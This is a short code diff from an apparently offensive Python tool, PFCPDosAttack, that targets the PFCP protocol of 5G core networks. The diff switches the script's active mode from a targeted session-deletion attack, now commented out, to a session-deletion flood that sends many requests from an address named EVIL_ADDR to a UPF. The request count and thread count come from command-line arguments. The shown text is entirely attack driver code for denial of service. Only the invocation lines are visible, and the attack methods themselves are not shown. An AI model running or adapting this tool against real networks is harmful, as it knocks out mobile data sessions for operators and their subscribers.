@@ -633,7 +633,12 @@ class PFCPDosAttack:
 
 
 ### SESSION DELETION ATTACK (targeted DoS)
+# objet_dos = PFCPDosAttack(EVIL_ADDR, UPF_ADDR, SRC_PORT, DEST_PORT)
+# objet_dos.set_verbose(True)
+# objet_dos.Start_pfcp_session_deletion_targeted(smf_addr=sys.argv[1], target_seid=int(sys.argv[2], 0))
+
+
+### SESSION DELETION ATTACK (DoS)
 objet_dos = PFCPDosAttack(EVIL_ADDR, UPF_ADDR, SRC_PORT, DEST_PORT)
 objet_dos.set_verbose(True)
-objet_dos.Start_pfcp_session_deletion_targeted(smf_addr=sys.argv[1], target_seid=int(sys.argv[2], 0))
-
+objet_dos.Start_pfcp_session_deletion_flood(reqNbr=int(sys.argv[1]), num_threads=int(sys.argv[2]))
